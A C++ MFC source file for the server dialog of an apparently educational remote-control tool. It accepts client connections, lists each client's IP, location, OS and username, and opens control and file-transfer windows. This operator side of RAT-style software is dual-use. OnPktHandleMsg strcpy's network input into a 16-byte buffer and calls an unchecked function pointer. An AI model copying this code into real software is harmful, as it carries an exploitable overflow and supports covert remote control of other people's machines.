
// DasBootServerDlg.cpp : implementation file
//

#include "stdafx.h"
#include "DasBootServer.h"
#include "DasBootServerDlg.h"
#include "afxdialogex.h"

#include "ClientManager.h"
#include "BufPacket.h"
#include "DasBootSocket.h"
#include "DasBootBasicCommands.h"
#include <string>
#include <unordered_map>

#include "ClientOperationMainWindow.h"
#include "LoadDll.h"

#include "FileTransferStatusDialog.h"

using namespace std;

DWORD SendPktThreadProc(LPARAM lparam);


#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// CAboutDlg dialog used for App About

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// Dialog Data
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_ABOUTBOX };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support

// Implementation
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CDasBootServerDlg dialog



CDasBootServerDlg::CDasBootServerDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(IDD_DASBOOTSERVER_DIALOG, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CDasBootServerDlg::DoDataExchange(CDataExchange* pDX)
{
  CDialogEx::DoDataExchange(pDX);
  DDX_Control(pDX, IDC_LIST_MAIN_CLIENT_LIST, m_lstctlClientList);
}

BEGIN_MESSAGE_MAP(CDasBootServerDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
  ON_BN_CLICKED(IDC_BUTTON_MAIN_START_LISTENING, &CDasBootServerDlg::OnBnClickedButtonMainStartListening)
  ON_MESSAGE(WM_PKTHANDLEMSG, OnPktHandleMsg)
  ON_BN_CLICKED(IDC_BUTTON_MAIN_STOP_LISTENING, &CDasBootServerDlg::OnBnClickedButtonMainStopListening)
  ON_WM_CLOSE()
  ON_BN_CLICKED(IDC_BUTTON_MAIN_START_OPERATION, &CDasBootServerDlg::OnBnClickedButtonMainStartOperation)
END_MESSAGE_MAP()


// CDasBootServerDlg message handlers
extern unordered_map<string, pfnDBExportServer> g_mapFunctions;
CDasBootServerDlg* g_pMainDlg = NULL;

BOOL CDasBootServerDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// Add "About..." menu item to system menu.

	// IDM_ABOUTBOX must be in the system command range.
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	// TODO: Add extra initialization here
  InitializeCriticalSection(&theApp.m_csSendListOperation);

  //专门用来发送消息的线程
  AfxBeginThread((AFX_THREADPROC)SendPktThreadProc, 0);

  //载入所有dll
  LoadExsitingDllWhenStartUp();

  AddBasicCommandsToMapFunctions();
  g_pMainDlg = this;

  m_lstctlClientList.ModifyStyle(0, LVS_REPORT);
  DWORD dwStye = m_lstctlClientList.GetExtendedStyle();
  dwStye = dwStye | LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES;
  m_lstctlClientList.SetExtendedStyle(dwStye);

  m_lstctlClientList.InsertColumn(0, _T("socket"), 0, 90);
  m_lstctlClientList.InsertColumn(1, _T("IP"), 0, 102);
  m_lstctlClientList.InsertColumn(2, _T("地理位置"), 0, 116);
  m_lstctlClientList.InsertColumn(3, _T("操作系统"), 0, 292);
  m_lstctlClientList.InsertColumn(4, _T("用户名"), 0, 100);
  m_lstctlClientList.InsertColumn(5, _T("系统运行时间"), 0, 90);

	return TRUE;  // return TRUE  unless you set the focus to a control
}

void CDasBootServerDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CDasBootServerDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

// The system calls this function to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CDasBootServerDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

extern CDasBootServerApp theApp;

DWORD SendPktThreadProc(LPARAM lparam)
{
  while (true)
  {
    if (theApp.m_nSendListElementCount != 0)
    {
      if (theApp.m_hSendListPkts.GetCount() != 0)
      {
        EnterCriticalSection(&theApp.m_csSendListOperation);

        SOCKET hSocket = theApp.m_hSendListSockets.GetTail();
        CBufPacket *pTmpPkt = theApp.m_hSendListPkts.GetTail();
        CDasBootSocket sendSkt(hSocket);
        sendSkt.SendData((*pTmpPkt).GetBuf(), (*pTmpPkt).GetLength());
        delete pTmpPkt;
        theApp.m_hSendListSockets.RemoveTail();
        theApp.m_hSendListPkts.RemoveTail();
        theApp.m_nSendListElementCount--;

        LeaveCriticalSection(&theApp.m_csSendListOperation);
      }
    }

    Sleep(50);  //30以上保险，否则易丢数据
  }

  return 0;
}

//EventSelect时间选择模型
DWORD ThreadProc(LPARAM lparam)
{
  CDasBootServerDlg* pDlg = (CDasBootServerDlg*)lparam;
  if (pDlg == NULL)
  {
    TRACE(_T("ThreadProc()中，获取CDasBootServerDlg的this指针失败"));

    return 0;
  }

  DWORD dwRet = 0;

  //用于accept的时候获取地址信息
  sockaddr_in tagRecvAddr;
  int nRecvAddrSize = sizeof(sockaddr_in);

  while (true)
  {
    //开始等待socketevent里面的事件
    dwRet = WSAWaitForMultipleEvents(theApp.GetSocketEventNum(), 
      theApp.GetEventAry(), FALSE, INFINITE,FALSE/*与completion routine 有关*/);

    if (dwRet == WSA_WAIT_FAILED)
    {
      TRACE(_T("WSAWaitForMultipleEvents()等待失败，ThreadProc线程被终止"));

      return 0;
    }
    else if (dwRet == WSA_WAIT_TIMEOUT)
    {
      //表示超时
      continue;
    }
    else if (dwRet >= WSA_WAIT_EVENT_0 &&
      dwRet <= (WSA_WAIT_EVENT_0 + WSA_MAXIMUM_WAIT_EVENTS))
    {
      //表示等到了合法事件信息
      int nFirstEventIndex = dwRet - WSA_WAIT_EVENT_0;  //当前合法信息的位置
      int nPotentialCount = theApp.GetSocketEventNum(); //所有（潜在合法）信息的数量

      //等到了合法事件信息后，从此往后依次看后面还有没有合法信息
      for (int i = nFirstEventIndex; i < nPotentialCount; i++)
      {
        dwRet = WSAWaitForMultipleEvents(1, &(theApp.GetEventAry()[i]), FALSE,
          0, FALSE);

        if (dwRet == WSA_WAIT_FAILED)
        {
          TRACE(_T("WSAWaitForMultipleEvents()等待失败，ThreadProc线程被终止"));

          return 0;
        }
        else if (dwRet == WSA_WAIT_TIMEOUT)
        {
          //表示超时
          continue;
        }

        int nIndex = i;
        //表示该socket有消息来,需要处理
        SOCKET hSocket = theApp.GetSocketFromSocketevent(nIndex);
        WSAEVENT hNotifyEvent = theApp.GetEventFromSocketevent(nIndex);
        WSANETWORKEVENTS tagNetworkEvent = { 0 };

        int nRet = WSAEnumNetworkEvents(hSocket, hNotifyEvent,
          &tagNetworkEvent);  //用于获取当前事件的详细信息

        if (nRet == SOCKET_ERROR)
        {
          //把该socket和事件从数组中删除,并释放资源
          /*确切来说，应该是WSAGetLastError()结果为WSAENOTSOCK，才删除，不过，发生错
          误的原因，绝大多数情况都是socket不合法*/
          theApp.DestorySocketEvent(nIndex);

          continue;
        }

        //一切合法之后，进行处理。两种情况：accept和read
        if (tagNetworkEvent.iErrorCode[FD_ACCEPT_BIT] == 0 &&
          tagNetworkEvent.lNetworkEvents == FD_ACCEPT)
        {
          //表示可以接受连接请求了
          memset(&tagRecvAddr, 0, sizeof(sockaddr_in));
          tagRecvAddr.sin_family = AF_INET;
          SOCKET hSocketConnection = accept(hSocket, (sockaddr*)&tagRecvAddr,
            &nRecvAddrSize);

          if (hSocketConnection == SOCKET_ERROR)
          {
            TRACE(_T("尝试建立新连接，但是accept()失败"));
            continue;
          }

          //接收到客户端的连接,加入到管理队列中
          //将连接的对象加入到m_ClientManager中
          CClientContext* pContext = new CClientContext(hSocketConnection,
            tagRecvAddr);
          theApp.m_objClientManager.Add(hSocketConnection, pContext);

          theApp.AddSocketEvent(hSocketConnection, WSACreateEvent());

          nRet = WSAEventSelect(
            theApp.GetSocketFromSocketevent(theApp.GetSocketEventNum() - 1),
            theApp.GetEventFromSocketevent(theApp.GetSocketEventNum() - 1),
            FD_READ | FD_WRITE | FD_CLOSE);

          if (nRet == SOCKET_ERROR)
          {
            TRACE("WSAAsyncSelect绑定 socket 失败");
            theApp.DecreaseSocketEventNum();
          }

          //在监听列表里加入此项
          CString strhSocketTmp;
          strhSocketTmp.Format("%d", hSocketConnection);

          pDlg->m_lstctlClientList.InsertItem( LVIF_TEXT | LVIF_STATE, 0, 
            strhSocketTmp, 0, 0, 0, 0);
          pDlg->m_lstctlClientList.SetItemData(0, hSocketConnection);

          //发送基本信息查询指令
          DBBCClientListInfoQueryC(hSocketConnection);
        }
        else if (tagNetworkEvent.iErrorCode[FD_READ_BIT] == 0 &&
          tagNetworkEvent.lNetworkEvents == FD_READ)
        {
          //1收到数据, 根据对应的socket找到对应的ClientContext
          CClientContext* pContext = NULL;
          BOOL bRet = theApp.m_objClientManager.FindAt(hSocket, pContext);
          if (!bRet || pContext == NULL)
          {
            return 0;
          }

          int nRecvedBytes = recv(hSocket, pContext->m_szRecvBuf, RECV_BYTES,
            0);

          //2将收到的数据加入到缓冲区中
          if (nRecvedBytes > 0)
          {
            pContext->m_Packet.Append(pContext->m_szRecvBuf, nRecvedBytes);
            //3检查缓冲区的大小,如果长度达到目标,那么开始调用处理函数
            pContext->m_Packet.Handle(hSocket);
          }

        }

      }//for (int i = nFirstEventIndex; i < nPotentialCount; i++)
    
    }//else if (dwRet >= WSA_WAIT_EVENT_0 && dwRet <= (WSA_WAIT_EVENT_0 + WSA_MAXIMUM_WAIT_EVENTS))
  
  }//while (true)

  return 0;
}

void CDasBootServerDlg::OnBnClickedButtonMainStartListening()
{
  // TODO: Add your control notification handler code here
  //1. 创建一个tcp的socket
  SOCKET hListeningSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

  if (hListeningSocket == INVALID_SOCKET)
  {
    TRACE(_T("创建监听socket失败"));
    AfxMessageBox(_T("创建监听socket失败"));

    return;
  }

  //2. 绑定ip和端口
  sockaddr_in tagAddr;
  memset(&tagAddr, 0, sizeof(sockaddr_in));

  tagAddr.sin_family = AF_INET;
  tagAddr.sin_port = htons(8889);
  tagAddr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");//INADDR_ANY;  //inet_addr("127.0.0.1");

  int nRet = bind(hListeningSocket, (sockaddr*)&tagAddr, sizeof(sockaddr_in));

  if (nRet == SOCKET_ERROR)
  {
    TRACE(_T("绑定监听socket至IP和端口时失败"));
    AfxMessageBox(_T("绑定监听socket至IP和端口时失败"));

    return;
  }

  //3. 开始监听
  nRet = listen(hListeningSocket, SOMAXCONN);

  if (nRet == SOCKET_ERROR)
  {
    TRACE(_T("开始监听失败"));
    AfxMessageBox(_T("开始监听失败"));

    return;
  }

  //4. 创建事件，和此socket绑定（套用event网络模型）
  WSAEVENT hListeningEvent = WSACreateEvent();

  if (hListeningEvent == WSA_INVALID_EVENT)
  {
    TRACE(_T("创建事件（用于监听socket）失败"));
    AfxMessageBox(_T("创建事件（用于监听socket）失败"));

    return;
  }

  //5. 增加此监听socket和event至theApp的列表中
  BOOL bRet = theApp.AddSocketEvent(hListeningSocket, hListeningEvent);

  if (bRet == FALSE)
  {
    TRACE("添加监听socket至theApp的socketevent数组失败");
    AfxMessageBox(_T("添加监听socket至theApp的socketevent数组失败"));

    return;
  }

  //6. 绑定监听socketevent（一般情况下，都会成功）。
  nRet = WSAEventSelect(hListeningSocket, hListeningEvent, 
    FD_ACCEPT | FD_CLOSE);

  if (nRet == SOCKET_ERROR)
  {
    TRACE("WSAEventSelect绑定（用于监听socketevent）失败");
    AfxMessageBox(_T("WSAEventSelect绑定（用于监听socketevent）失败"));

    return;
  }

  //7. 若一切成功，开启线程处理socketevent（这也是本程序用于处理所有socket的唯一线程）
  //本程序用了event网络模型，用单线程监听所有socket，同一时间支持socket数量最大值：64
  AfxBeginThread((AFX_THREADPROC)ThreadProc, this);

}



HRESULT CDasBootServerDlg::OnPktHandleMsg(WPARAM wParam, LPARAM lParam)
{

  SOCKET sRecv = (SOCKET)wParam;
  char* pszBuf = (char*)lParam;

  if (pszBuf == NULL)
  {
    return 0;
  }

  int nMsgLength = (int &)(*pszBuf);

  char szMsgType[16] = { 0 };
  strcpy(szMsgType, pszBuf + 4);

  pfnDBExportServer pfn;
  pfn = g_mapFunctions[szMsgType];

  CClientContext *pClientContext = NULL;
  theApp.m_objClientManager.FindAt(sRecv, pClientContext);

  pfn(pszBuf + 4 + 16, sRecv, nMsgLength, pClientContext, &SendMessageOut);

  //SendMessageOut(sRecv, _T("HelloWorldTempu"), _T("nihao测试锄禾日当午"));

  return 0;
}



void CDasBootServerDlg::OnBnClickedButtonMainStopListening()
{
  // TODO: Add your control notification handler code here
}


void CDasBootServerDlg::OnClose()
{
  // TODO: Add your message handler code here and/or call default
  DeleteCriticalSection(&theApp.m_csSendListOperation);

  CDialogEx::OnClose();
}


void CDasBootServerDlg::OnBnClickedButtonMainStartOperation()
{
  // TODO: Add your control notification handler code here
  for (int i = 0; i < m_lstctlClientList.GetItemCount(); i++)
  {
    if (m_lstctlClientList.GetItemState(i, LVIS_SELECTED) == LVIS_SELECTED)
    {
      SOCKET hSocket = m_lstctlClientList.GetItemData(i);
      
      CClientOperationMainWindow *pClientOperationMainWindow = 
        new CClientOperationMainWindow;

      CFileTransferStatusDialog *pFileTransferWindow =
        new CFileTransferStatusDialog;

      CClientContext *pClientContext = NULL;
      theApp.m_objClientManager.FindAt(hSocket, pClientContext);

      if (pClientContext->m_pMyClientOperationMainWindow != NULL)
      {
        delete pClientContext->m_pMyClientOperationMainWindow;
        pClientContext->m_pMyClientOperationMainWindow = NULL;
      }

      if (pClientContext->m_pFileTransferWindow != NULL)
      {
        delete pClientContext->m_pFileTransferWindow;
        pClientContext->m_pFileTransferWindow = NULL;
      }

      pClientContext->m_pMyClientOperationMainWindow = 
        pClientOperationMainWindow;

      pClientContext->m_pFileTransferWindow = pFileTransferWindow;

      pClientOperationMainWindow->Create(
        IDD_DIALOG_CLIENT_OPERATION_MAIN_WINDOW, this);
      pClientOperationMainWindow->ShowWindow(SW_SHOW);
      pClientOperationMainWindow->m_hSocket = hSocket;

      pFileTransferWindow->Create(
        IDD_DIALOG_CLIENT_OPERATION_MAIN_WINDOW_FILE_TRANSFER_SUB_WINDOW, this);

      CString strWindowCaption;
      strWindowCaption.Format("%s %d", _T("客户控制主窗口 客户socket："), 
        (int)hSocket);
      pClientOperationMainWindow->SetWindowText(strWindowCaption);

      strWindowCaption.Format("%s %d", _T("文件传输状态 客户socket："),
        (int)hSocket);
      pFileTransferWindow->SetWindowText(strWindowCaption);
    }
  }
}
